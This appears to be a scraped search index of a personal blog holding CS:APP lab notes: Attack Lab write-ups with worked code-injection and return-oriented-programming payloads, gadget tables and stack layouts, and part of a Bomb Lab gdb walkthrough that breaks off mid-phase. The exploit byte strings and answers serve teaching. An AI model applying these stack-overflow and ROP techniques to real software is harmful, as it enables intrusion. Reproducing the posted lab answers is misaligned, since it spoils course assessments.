too large: long time to evict memory to be continued … ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/csapp_class_notes/:7:4","tags":null,"title":"CSAPP_class_notes","uri":"/zh-cn/posts/csapp/csapp_class_notes/"},{"categories":null,"content":"朋友你好，欢迎来到我的博客！ 我是叶文涛，在上海商汤科技工作，目前担任深度学习系统研发工程师 联系邮箱: zhyanwentao@outlook.com 注意：如果你看不到博客中的图片，请使用代理 ","date":"2023-02-03","objectID":"/zh-cn/about/:0:0","tags":null,"title":"About","uri":"/zh-cn/about/"},{"categories":["csapp"],"content":"等待被翻译 非常抱歉，看起来这篇博文还没有被翻译成中文，请等待一段时间 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:1:0","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Set up Environment Using a docker container is the simplest way, source from yansongsongsong docker run --privileged -d -p 1221:22 --name bomb yansongsongsong/csapp:attacklab Then using vscode remote ssh to connect with it as we described in datalab password: THEPASSWORDYOUCREATED ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:2:0","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Part1: Code Injection Attacks ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:3:0","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_1 This phase requires us to call touch1() at the end of test() in ctarget void test() { int val; val = getbuf(); // here is a dangerous getbuf call that we can make use of printf(\"No exploit. Getbuf returned 0x%x\\n\", val); } void touch1() { vlevel = 1; /* Part of validation protocol */ printf(\"Touch1!: You called touch1()\\n\"); validate(1); exit(0); } Firstly let’s see assembly code: objdump -d ctarget \u003e ctarget.asm 00401968 \u003ctest\u003e: 401968: 48 83 ec 08 sub $0x8,%rsp 40196c: b8 00 00 00 00 mov $0x0,%eax 401971: e8 32 fe ff ff callq 4017a8 \u003cgetbuf\u003e 401976: 89 c2 mov %eax,%edx 401978: be 88 31 40 00 mov $0x403188,%esi 40197d: bf 01 00 00 00 mov $0x1,%edi 401982: b8 00 00 00 00 mov $0x0,%eax 401987: e8 64 f4 ff ff callq 400df0 \u003c__printf_chk@plt\u003e 40198c: 48 83 c4 08 add $0x8,%rsp We notice that there is a call for getbuf(), and the address of touch1 is 004017c0 \u003ctouch1\u003e. 004017a8 \u003cgetbuf\u003e: 4017a8: 48 83 ec 28 sub $0x28,%rsp 4017ac: 48 89 e7 mov %rsp,%rdi 4017af: e8 8c 02 00 00 callq 401a40 \u003cGets\u003e 4017b4: b8 01 00 00 00 mov $0x1,%eax 4017b9: 48 83 c4 28 add $0x28,%rsp 4017bd: c3 retq Here function Gets put the value we input in %rsp, see disas Gets for more details if you are interested. Here is the stack: | return address | | 0x28 | | 0x20 | | 0x18 | | 0x10 | | 0x08 | | 0x00 | So we should put more things than 0x28, the additional 0x004017c0covering the return address Then we get the answer: (little-endian) 00 00 00 00 00 00 00 00 // 64 bit, 8 bytes 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 // 0x28 bytes c0 17 40 00 // use `touch1` to cover the return address Save it in phase_1_raw.txt(remove the comments) then ./hex2raw \u003cphase_1_raw.txt \u003ephase_1.txt then ./ctarget -qi phase_1.txt to pass the phase_1 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:3:1","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_2 This phase we need to call touch2, and the cookie should equal to the value void touch2(unsigned val) { vlevel = 2; /* Part of validation protocol */ if (val == cookie) { printf(\"Touch2!: You called touch2(0x%.8x)\\n\", val); validate(2); } else { printf(\"Misfire: You called touch2(0x%.8x)\\n\", val); fail(2); } exit(0); } Dump of assembler code for function touch2: 0x004017ec \u003c+0\u003e: sub $0x8,%rsp // .... It is clear that we should not only change the return address, but also change the value of val(%rdi), to match the cookie(0x59b997fa) How could we change the value of %rdi? we can inject movq $0x59b997fa %rdi instruction to the buffer. Here are all of the instructions we need: movq $0x59b997fa, %rdi // move cookie to rdi pushq $0x4017ec // push the touch2 address to the stack ret // pop the stack and jump to the address Saved it in phase_2_inject.s then gcc -c phase_2_inject.s Finally objdump -d phase_2_inject.o we get the codes 0: 48 c7 c7 fa 97 b9 59 mov $0x59b997fa,%rdi 7: 68 ec 17 40 00 pushq $0x4017ec c: c3 retq We also need to make sure the codes above can be executed. How could we do that? Considering the stack: | return address | // return address of after calling `get_buf` | 0x28 | | 0x20 | | 0x18 | | 0x10 | | 0x08 | | 0x00 | // %rsp We can put our codes to %rsp and then make the return address pointing to that %rsp, like this: | return: %rsp | // return address of after calling `get_buf` | .... | | .... | | .... | | ret | | pushq | | move | // %rsp How to get the address of %rsp? Using gdb, stepi to 4017a8: 48 83 ec 28 sub $0x28,%rsp, then p $rsp and we get 0x5561dc78 Now we can make the answer: 48 c7 c7 fa 97 b9 59 68 ec 17 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 Note: if you use gdb to see %rsp after calling getbuf, you’ll see 0x5561dc78: 0x48 0xc7 0xc7 0xfa 0x97 0xb9 0x59 0x68 0x5561dc80: 0xec 0x17 0x40 0x00 0xc3 0x00 0x00 0x00 0x5561dc88: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5561dc90: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5561dc98: 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x5561dca0: 0x78 0xdc 0x61 0x55 0x00 0x00 0x00 0x00 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:3:2","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_3 This phase needs us to call touch3, and pass the validation int hexmatch(unsigned val, char *sval) { char cbuf[110]; /* Make position of check string unpredictable */ char *s = cbuf + random() % 100; // \"%.8x\" means put the unsigned hex string of cookie to s sprintf(s, \"%.8x\", val); // When using strncmp, actually compare about the ascii // ascii string of cookie(ascii): 35 39 62 39 39 37 66 61 return strncmp(sval, s, 9) == 0; } void touch3(char *sval) // address of touch3：0x4018fa { vlevel = 3; /* Part of validation protocol */ if (hexmatch(cookie, sval)) { printf(\"Touch3!: You called touch3(\\\"%s\\\")\\n\", sval); validate(3); } else { printf(\"Misfire: You called touch3(\\\"%s\\\")\\n\", sval); fail(3); } exit(0); } Now that the address pointer s is unpredictable, we can’t directly change the value of it. But we can still change the value of *sval(%rdi). Note: This time it is a pointer (simply a value in phase_2), we must pass an address to it and then store our hex cookie in that address. we may consider injecting codes like: movq $address, %rdi // the address of our cookie pushq $0x4018fa // address of touch3 ret // return to touch3 But what address should we use? If we put it in the buffer, like: | return: %rsp | // return address of after calling `get_buf` | .... | | cookie | | .... | | ret | | pushq | | move | // %rsp: 0x5561dc78 We may not get the correct answer. See the codes of hexmatch and touch3: 000000000040184c \u003chexmatch\u003e: 40184c: 41 54 push %r12 40184e: 55 push %rbp 40184f: 53 push %rbx // ... 00000000004018fa \u003ctouch3\u003e: 4018fa: 53 push %rbx // ... As we can see here, the touch3 and hexmatch push data into stack and may cover the buffer we try to input. This is because after we call Gets() in getbuf(), the stack is like this: | return: %rsp | // return address of after calling `get_buf` | .... | | .... | | .... | | ret | | pushq | | move | // %rsp: 0x5561dc78 But in the end of getbuf, it will add 0x28 to %rsp and then pushq and make it 0x5561dca8, the stack is now like this: | .... | // %rsp: 0x5561dca8 | return: %rsp | | .... | // value here may be covered by push! | .... | // value here may be covered by push! | .... | // value here may be covered by push! | ret | | pushq | | move | // %rsp before: 0x5561dc78 So we have to find a new address to put our hex cookie value, considering using the frame of test(), it will not be affected by any pushq | frame: test | | .... | // address: 0x5561dca8 | return address | | .... | | frame: getbuf | | .... | we can make it like this: | frame: test | | cookie value | // address: 0x5561dca8, in frame of test | return: %rsp | // execute our injected code in 0x5561dc78 | .... | | .... | | .... | | ret | | pushq | | move | // %rsp: 0x5561dc78 And now we can get the answer: movq $0x5561dca8, %rdi // the address of our cookie pushq $0x4018fa // address of touch3 ret // return to touch3 // generating the assembly codes 0: 48 c7 c7 a8 dc 61 55 mov $0x5561dca8,%rdi 7: 68 fa 18 40 00 pushq $0x4018fa c: c3 retq And make it to the final answer: 48 c7 c7 a8 dc 61 55 68 // address: 0x5561dc78, executing our code fa 18 40 00 c3 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 dc 61 55 00 00 00 00 // return to 0x5561dc78 35 39 62 39 39 37 66 61 // our hex cookie saved in $0x5561dca8 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:3:3","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Part2: Return-Oriented Programming In real environment, it’s hard to inject code because we have Stack Randomization and Stack Read-Only Access. So we have to use the current codes(gadget) to attack. For instance: void setval_210(unsigned *p) { *p = 3347663060U; } // compiling... 400f15: c7 07 d4 48 89 c7 movl $0xc78948d4,(%rdi) 400f1b: c3 retq 48 89 c7 is movq %rax, %rdi and c3 is retq So if we starts from 400f18, it’s like we are executing movq %rax, %rdi retq ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:4:0","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_4 This phase requires us to repeat the attack of phase_2, but using Rtarget. we can only use instructions of movq popq ret nop and the first eight x86-64 registers (%rax–%rdi). Recall the phase_2, we need to realize: move cookie to $rdi execute touch2 Firstly objdump -d rtarget \u003e rtarget.asm to see what gadgets we can make use of. If we can find gadgets like popq %rdi(5f), that could be quite easy, but we can’t find one in farm. So we decide to use 58（popq %rax), the instrcutions are: popq %rax // 58 ret // c3 moveq %rax, %rdi // 48 89 c7 ret // c3 The gadgets we use are: 00000000004019ca \u003cgetval_280\u003e: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 retq 00000000004019a0 \u003caddval_273\u003e: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq The stack is like: | return: touch2 | |return: 0x4019a2| // execute 48 89 c7(moveq %rax, %rdi) then ret | cookie value | // after popq, the value here is stored in %rax |return: 0x4019cc| // execute 58 (popq %rax) then ret | .... | | .... | | .... | | .... | | .... | | .... | // %get buf start So we can get the answer: (Note: ret get 8 bytes of address) 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 cc 19 40 00 00 00 00 00 fa 97 b9 59 00 00 00 00 a2 19 40 00 00 00 00 00 ec 17 40 00 00 00 00 00 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:4:1","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"phase_5 This phase requires us to repeat the attack of phase_3, but using Rtarget. Including movq popq ret nop, we can now use movl and additional func nop(andb, orb, cmpb, testb). Note these func nop do not change the value in our registers. Recall the phase_3, we need to realize: save cookie in address x, move x to $rdi execute touch3 Note we can’t declare an address x directly like phase_2 because of stack randomization, how could we get the address of x? Although the address of %rsp is always changing, the offset is always the same. For example, we may put our string in address %rsp + 0x30, and pass the address (%rsp + 0x30) to %rdi. So we may want to find instructions like: popq %rax // and our offset saved in %rax lea (%rsp, %rax, 1), %rdi Unlucily, we don’t find an instruction for lea (%rsp, %rax, 1), %rdi, but we can find another one here: 00000000004019d6 \u003cadd_xy\u003e: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq So we can generate our instrucstions based on add_xy: // no `movq %rsp, %rdi; ret` found in farm, so use %rax as a temp movq %rsp, %rax ret // 48 89 e0 ... c3 0x401aad \u003csetval_350\u003e movq %rax, %rdi ret // 48 89 c7 ... c3 0x4019c5 \u003csetval_426\u003e popq %rax ret // pop offset to %rax, 58 ... c3 0x4019cc \u003cgetval_280\u003e // no `movq %rax, %rsi` or `movl %eax, %esi` found in farm // so we have to use `%edx`, `%ecx` as temp movl %eax, %edx ret // 89 c2 ... c3 0x4019dd \u003cgetval_481\u003e movl %edx, %ecx ret // 89 d1 ... c3 0x401a34 \u003cgetval_159\u003e (38 c9 is a nop) movl %ecx, %esi ret // 89 ce ... c3 0x401a13 \u003caddval_436\u003e \u003cadd_xy\u003e // lea and ret, 0x4019d6 movq %rax,%rdi ret // 48 89 c7 ... c3 0x4019a2 \u003caddval_273\u003e The stack is like: | our hex cookie | // our hex cookie value here |return: 0x4018fa| // execute touch3 |return: 0x4019a2| // execute `movq %rax,%rdi ret` |return: 0x4019d6| // execute \u003cadd_xy\u003e |return: 0x401a13| // execute `movl %ecx, %esi ret` |return: 0x401a34| // execute `movl %edx, %ecx ret` |return: 0x4019dd| // execute `movl %eax, %edx ret` | offset: 0x?? | // our offset here |return: 0x4019cc| // execute `popq %rax ret` |return: 0x4019c5| // execute `movq %rax, %rdi ret` |return: 0x401aad| // execute `movq %rsp, %rax ret` // %getbuf + 0x30 | .... | | .... | | .... | | .... | | .... | | .... | // %get buf start But here comes another question: what’s the offset should be? Note: Dump of assembler code for function getbuf 0x00000000004017a8 \u003c+0\u003e: sub $0x28,%rsp 0x00000000004017ac \u003c+4\u003e: mov %rsp,%rdi 0x00000000004017af \u003c+7\u003e: callq 0x401b60 \u003cGets\u003e 0x00000000004017b4 \u003c+12\u003e: mov $0x1,%eax 0x00000000004017b9 \u003c+17\u003e: add $0x28,%rsp =\u003e 0x00000000004017bd \u003c+21\u003e: retq Recall that when retq, the %rsp adds 0x8, and get the address back. So when executing movq %rsp, %rax, the %rsp is now pointing at | our hex cookie | // %rsp + 0x50 |return: 0x4018fa| // execute touch3 |return: 0x4019a2| |return: 0x4019d6| |return: 0x401a13| |return: 0x401a34| |return: 0x4019dd| | offset: 0x?? | |return: 0x4019cc| |return: 0x4019c5| |return: 0x401aad| // execute `movq %rsp, %rax ret` // %rsp here | .... | | .... | So we know the offset is 0x50 And we can finally get our answer: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 ad 1a 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 cc 19 40 00 00 00 00 00 50 00 00 00 00 00 00 00 dd 19 40 00 00 00 00 00 34 1a 40 00 00 00 00 00 13 1a 40 00 00 00 00 00 d6 19 40 00 00 00 00 00 c5 19 40 00 00 00 00 00 a2 19 40 00 00 00 00 00 fa 18 40 00 00 00 00 00 35 39 62 39 39 37 66 61 Good luck! ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:4:2","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"Appendix: farm 0000000000401994 \u003cstart_farm\u003e: 401994: b8 01 00 00 00 mov $0x1,%eax 401999: c3 retq 000000000040199a \u003cgetval_142\u003e: 40199a: b8 fb 78 90 90 mov $0x909078fb,%eax 40199f: c3 retq 00000000004019a0 \u003caddval_273\u003e: 4019a0: 8d 87 48 89 c7 c3 lea -0x3c3876b8(%rdi),%eax 4019a6: c3 retq 00000000004019a7 \u003caddval_219\u003e: 4019a7: 8d 87 51 73 58 90 lea -0x6fa78caf(%rdi),%eax 4019ad: c3 retq 00000000004019ae \u003csetval_237\u003e: 4019ae: c7 07 48 89 c7 c7 movl $0xc7c78948,(%rdi) 4019b4: c3 retq 00000000004019b5 \u003csetval_424\u003e: 4019b5: c7 07 54 c2 58 92 movl $0x9258c254,(%rdi) 4019bb: c3 retq 00000000004019bc \u003csetval_470\u003e: 4019bc: c7 07 63 48 8d c7 movl $0xc78d4863,(%rdi) 4019c2: c3 retq 00000000004019c3 \u003csetval_426\u003e: 4019c3: c7 07 48 89 c7 90 movl $0x90c78948,(%rdi) 4019c9: c3 retq 00000000004019ca \u003cgetval_280\u003e: 4019ca: b8 29 58 90 c3 mov $0xc3905829,%eax 4019cf: c3 retq 00000000004019d0 \u003cmid_farm\u003e: 4019d0: b8 01 00 00 00 mov $0x1,%eax 4019d5: c3 retq 00000000004019d6 \u003cadd_xy\u003e: 4019d6: 48 8d 04 37 lea (%rdi,%rsi,1),%rax 4019da: c3 retq 00000000004019db \u003cgetval_481\u003e: 4019db: b8 5c 89 c2 90 mov $0x90c2895c,%eax 4019e0: c3 retq 00000000004019e1 \u003csetval_296\u003e: 4019e1: c7 07 99 d1 90 90 movl $0x9090d199,(%rdi) 4019e7: c3 retq 00000000004019e8 \u003caddval_113\u003e: 4019e8: 8d 87 89 ce 78 c9 lea -0x36873177(%rdi),%eax 4019ee: c3 retq 00000000004019ef \u003caddval_490\u003e: 4019ef: 8d 87 8d d1 20 db lea -0x24df2e73(%rdi),%eax 4019f5: c3 retq 00000000004019f6 \u003cgetval_226\u003e: 4019f6: b8 89 d1 48 c0 mov $0xc048d189,%eax 4019fb: c3 retq 00000000004019fc \u003csetval_384\u003e: 4019fc: c7 07 81 d1 84 c0 movl $0xc084d181,(%rdi) 401a02: c3 retq 0000000000401a03 \u003caddval_190\u003e: 401a03: 8d 87 41 48 89 e0 lea -0x1f76b7bf(%rdi),%eax 401a09: c3 retq 0000000000401a0a \u003csetval_276\u003e: 401a0a: c7 07 88 c2 08 c9 movl $0xc908c288,(%rdi) 401a10: c3 retq 0000000000401a11 \u003caddval_436\u003e: 401a11: 8d 87 89 ce 90 90 lea -0x6f6f3177(%rdi),%eax 401a17: c3 retq 0000000000401a18 \u003cgetval_345\u003e: 401a18: b8 48 89 e0 c1 mov $0xc1e08948,%eax 401a1d: c3 retq 0000000000401a1e \u003caddval_479\u003e: 401a1e: 8d 87 89 c2 00 c9 lea -0x36ff3d77(%rdi),%eax 401a24: c3 retq 0000000000401a25 \u003caddval_187\u003e: 401a25: 8d 87 89 ce 38 c0 lea -0x3fc73177(%rdi),%eax 401a2b: c3 retq 0000000000401a2c \u003csetval_248\u003e: 401a2c: c7 07 81 ce 08 db movl $0xdb08ce81,(%rdi) 401a32: c3 retq 0000000000401a33 \u003cgetval_159\u003e: 401a33: b8 89 d1 38 c9 mov $0xc938d189,%eax 401a38: c3 retq 0000000000401a39 \u003caddval_110\u003e: 401a39: 8d 87 c8 89 e0 c3 lea -0x3c1f7638(%rdi),%eax 401a3f: c3 retq 0000000000401a40 \u003caddval_487\u003e: 401a40: 8d 87 89 c2 84 c0 lea -0x3f7b3d77(%rdi),%eax 401a46: c3 retq 0000000000401a47 \u003caddval_201\u003e: 401a47: 8d 87 48 89 e0 c7 lea -0x381f76b8(%rdi),%eax 401a4d: c3 retq 0000000000401a4e \u003cgetval_272\u003e: 401a4e: b8 99 d1 08 d2 mov $0xd208d199,%eax 401a53: c3 retq 0000000000401a54 \u003cgetval_155\u003e: 401a54: b8 89 c2 c4 c9 mov $0xc9c4c289,%eax 401a59: c3 retq 0000000000401a5a \u003csetval_299\u003e: 401a5a: c7 07 48 89 e0 91 movl $0x91e08948,(%rdi) 401a60: c3 retq 0000000000401a61 \u003caddval_404\u003e: 401a61: 8d 87 89 ce 92 c3 lea -0x3c6d3177(%rdi),%eax 401a67: c3 retq 0000000000401a68 \u003cgetval_311\u003e: 401a68: b8 89 d1 08 db mov $0xdb08d189,%eax 401a6d: c3 retq 0000000000401a6e \u003csetval_167\u003e: 401a6e: c7 07 89 d1 91 c3 movl $0xc391d189,(%rdi) 401a74: c3 retq 0000000000401a75 \u003csetval_328\u003e: 401a75: c7 07 81 c2 38 d2 movl $0xd238c281,(%rdi) 401a7b: c3 retq 0000000000401a7c \u003csetval_450\u003e: 401a7c: c7 07 09 ce 08 c9 movl $0xc908ce09,(%rdi) 401a82: c3 retq 0000000000401a83 \u003caddval_358\u003e: 401a83: 8d 87 08 89 e0 90 lea -0x6f1f76f8(%rdi),%eax 401a89: c3 retq 0000000000401a8a \u003caddval_124\u003e: 401a8a: 8d 87 89 c2 c7 3c lea 0x3cc7c289(%rdi),%eax 401a90: c3 retq 0000000000401a91 \u003cgetval_169\u003e: 401a91: b8 88 ce 20 c0 mov $0xc020ce88,%eax 401a96: c3 retq 0000000000401a97 \u003csetval_181\u003e: 401a97: c7 07 48 89 e0 c2 movl $0xc2e08948,(%rdi) 401a9d: c3 retq 0000000000401a9e \u003caddval_184\u003e: 401a9e: 8d 87 89 c2 60 d2 lea -0x2d9f3d77(%rdi),%eax 401aa4: c3 retq 0000000000401aa5 \u003cgetval_472\u003e: 401aa5: b8 8d ce 20 d2 mov $0xd2","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/attacklab/:4:3","tags":null,"title":"Attacklab","uri":"/zh-cn/posts/csapp/attacklab/"},{"categories":["csapp"],"content":"等待被翻译 非常抱歉，看起来这篇博文还没有被翻译成中文，请等待一段时间 ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:1:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Set up Environment Using a docker container is the simplest way, source from yansongsongsong docker run --privileged -d -p 1221:22 --name bomb yansongsongsong/csapp:bomblab Then using vscode remote ssh to connect with it as we described in datalab password: THEPASSWORDYOUCREATED ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:2:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Commands We usually use gdb -q bomb # start debugging b explode_bomb # help you break before bomb stepi # run into next instruction (stepin) nexti # run into next instruction (not stepin the funcs) disas phase_1 # make binary coding into assembly, helpful x/s 0x402400 # get the string value in address 0x402400 i registers # print the register infos p $rsp # print the value of variable ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:3:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Phase_1 assembler code for function phase_1: 0x000400ee0 \u003c+0\u003e: sub $0x8,%rsp 0x000400ee4 \u003c+4\u003e: mov $0x402400,%esi // move 0x402400 to %esi 0x000400ee9 \u003c+9\u003e: callq 0x401338 \u003cstrings_not_equal\u003e 0x000400eee \u003c+14\u003e: test %eax,%eax // judge if eax == 1 0x000400ef0 \u003c+16\u003e: je 0x400ef7 \u003cphase_1+23\u003e // jump if equal/zero 0x000400ef2 \u003c+18\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x000400ef7 \u003c+23\u003e: add $0x8,%rsp 0x000400efb \u003c+27\u003e: retq strings_not_equal compares two strings in register %rdi, %rsi, then saves 0 in %rax if they are same, 1 otherwise. If you are interested, disas strings_not_equal for more details. So this phase is to compare the strings, if they are not the same, bomb. So we can use x/s 0x402400 to see the string, that is the answer. (gdb) x/s 0x402400 0x402400: \"Border relations with Canada have never been better.\" ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:4:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Phase_2 Dump of assembler code for function phase_2: 0x00400efc \u003c+0\u003e: push %rbp 0x00400efd \u003c+1\u003e: push %rbx 0x00400efe \u003c+2\u003e: sub $0x28,%rsp 0x00400f02 \u003c+6\u003e: mov %rsp,%rsi 0x00400f05 \u003c+9\u003e: callq 0x40145c \u003cread_six_numbers\u003e // considering read_six_numbers a black box // after calling this, we find that (%rsp) is the first element we input // so here we know the first element must be number 1 // what's more, by using `x/8w $rsp` we know the number's relation with rsp // eg: we input 1 2 3 4 5 6, so // x/8w $rsp // 0x7fffffffe1d0: 0x00000001 0x00000002 0x00000003 0x00000004 // 0x7fffffffe1e0: 0x00000005 0x00000006 0x00401431 0x 0x00400f0a \u003c+14\u003e: cmpl $0x1,(%rsp) 0x00400f0e \u003c+18\u003e: je 0x400f30 \u003cphase_2+52\u003e // jump if (%rsp) == 1 0x00400f10 \u003c+20\u003e: callq 0x40143a \u003cexplode_bomb\u003e ---------------------------------------------------------- 0x00400f15 \u003c+25\u003e: jmp 0x400f30 \u003cphase_2+52\u003e 0x00400f17 \u003c+27\u003e: mov -0x4(%rbx),%eax 0x00400f1a \u003c+30\u003e: add %eax,%eax 0x00400f1c \u003c+32\u003e: cmp %eax,(%rbx) // here (%rbx) should equal to the 2 * -0x4(%rbx) // rbx = rsp + 0x4 when first here // then(second, third ...), rbx = rbx + 0x4 0x00400f1e \u003c+34\u003e: je 0x400f25 \u003cphase_2+41\u003e 0x00400f20 \u003c+36\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00400f25 \u003c+41\u003e: add $0x4,%rbx 0x00400f29 \u003c+45\u003e: cmp %rbp,%rbx // here is a loop, if rbx == rbp(rsp + 0x18), then quit // else go to the phase_2 + 27 again 0x00400f2c \u003c+48\u003e: jne 0x400f17 \u003cphase_2+27\u003e 0x00400f2e \u003c+50\u003e: jmp 0x400f3c \u003cphase_2+64\u003e 0x00400f30 \u003c+52\u003e: lea 0x4(%rsp),%rbx 0x00400f35 \u003c+57\u003e: lea 0x18(%rsp),%rbp 0x00400f3a \u003c+62\u003e: jmp 0x400f17 \u003cphase_2+27\u003e 0x00400f3c \u003c+64\u003e: add $0x28,%rsp 0x00400f40 \u003c+68\u003e: pop %rbx 0x00400f41 \u003c+69\u003e: pop %rbp 0x00400f42 \u003c+70\u003e: retq Dump of assembler code for function read_six_numbers: 0x0040145c \u003c+0\u003e: sub $0x18,%rsp 0x00401460 \u003c+4\u003e: mov %rsi,%rdx 0x00401463 \u003c+7\u003e: lea 0x4(%rsi),%rcx 0x00401467 \u003c+11\u003e: lea 0x14(%rsi),%rax 0x0040146b \u003c+15\u003e: mov %rax,0x8(%rsp) 0x00401470 \u003c+20\u003e: lea 0x10(%rsi),%rax 0x00401474 \u003c+24\u003e: mov %rax,(%rsp) 0x00401478 \u003c+28\u003e: lea 0xc(%rsi),%r9 0x0040147c \u003c+32\u003e: lea 0x8(%rsi),%r8 0x00401480 \u003c+36\u003e: mov $0x4025c3,%esi 0x00401485 \u003c+41\u003e: mov $0x0,%eax 0x0040148a \u003c+46\u003e: callq 0x400bf0 \u003c__isoc99_sscanf@plt\u003e // Consider scanf is a black box // after calling scanf, we find that eax = the number of element we input // so here we know we should input more than 5 numbers 0x0040148f \u003c+51\u003e: cmp $0x5,%eax 0x00401492 \u003c+54\u003e: jg 0x401499 \u003cread_six_numbers+61\u003e // jump if eax \u003e 5 0x00401494 \u003c+56\u003e: callq 0x40143a \u003cexplode_bomb\u003e 0x00401499 \u003c+61\u003e: add $0x18,%rsp 0x0040149d \u003c+65\u003e: retq Carefully read all of the codes above, we can know: we should input more than five numbers the first number should be 1 numbers[i+i] = numbers[i] * 2 So we get the answer: 1 2 4 8 16 32 You can also type lots of numbers, that doesn’t matter: 1 2 4 8 16 32 64 ... ","date":"2023-02-03","objectID":"/zh-cn/posts/csapp/bomblab/:5:0","tags":null,"title":"Bomblab","uri":"/zh-cn/posts/csapp/bomblab/"},{"categories":["csapp"],"content":"Phase_3 Dump of assembler code for function phase_3: 0x00400f43 \u003c+0\u003e: sub $0x18,%rsp 0x00400f47 \u003c+4\u003e: lea 0xc(%rsp),%rcx 0x00400f4c \u003c+9\u003e: lea 0x8(%rsp),%rdx // move $0x4025cf to the second argument of sscanf // by `x/s 0x4025cf` we get \"%d %d\", so here we know we should input 2 numbers 0x00400f51 \u003c+14\u003e: mov $0x4025cf,%esi 0x00400f56 \u003c+19\u003e: mov $0x0,%eax 0x00400f5b \u003c+24\u003e: callq 0x400bf0 \u003c__isoc99_sscanf@plt\u003e // according to phase_2, we know %eax is the number of elements we input // so we should type more than 1 element, which also validates the %d %d above // what's more, if you command `x/4w $rsp`, you'll find the elements you input // at 0x8(%rsp), 0xc(%rsp) 0x00400f60 \u003c+29\u003e: cmp $0x1,%eax 0x00400f63 \u003c+32\u003e: jg 0x400f6a \u003cphase_3+39\u003e 0x00400f65 \u003c+34\u003e: callq 0x40143a \u003cexplode_bomb\u003e // here the first element should not big than 7 0x00400f6a \u003c+39\u003e: cmpl $0x7,0x8(%rsp) 0x00400f6f \u003c+44\u003e: ja 0x400fad \u003cphase_3+106\u003e --------------------------------------------------------------- 0x00400f71 \u003c+46\u003e: mov 0x8(%rsp),%eax // calculate address = 8 * rax + 0x402470, then get the value saved in address // then jump to the value address, usually used in switch table // 8 means 8 bytes a unit, so we can use `x/8xg 0x402470` to see the table // 0x402470: 0x00400f7c 0x00400fb9 // 0x402480: 0x00400f83 0x00400f8a // 0x402490: 0x00400f91 0x00400f98 // 0x4024a0: 0x00400f9f 0x00400fa6 // so we know the first number we input is used to get to the different branch 0x00400f75 \u003c+50\u003e: jmpq *0x402470(,%rax,8) 0x00400f7c \u003c+57\u003e: mov $0xcf,%eax // eax = 207 0x00400f81 \u003c+62\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f83 \u003c+64\u003e: mov $0x2c3,%eax // eax = 707 0x00400f88 \u003c+69\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f8a \u003c+71\u003e: mov $0x100,%eax // eax = 256 0x00400f8f \u003c+76\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f91 \u003c+78\u003e: mov $0x185,%eax // eax = 389 0x00400f96 \u003c+83\u003e: jmp 0x400fbe \u003cphase_3+123\u003e 0x00400f98 \u003c+85\u003e: mov $0xce,%eax // eax = 206 0x00400f9d \u003c+90\u003e: jmp 0x400fbe 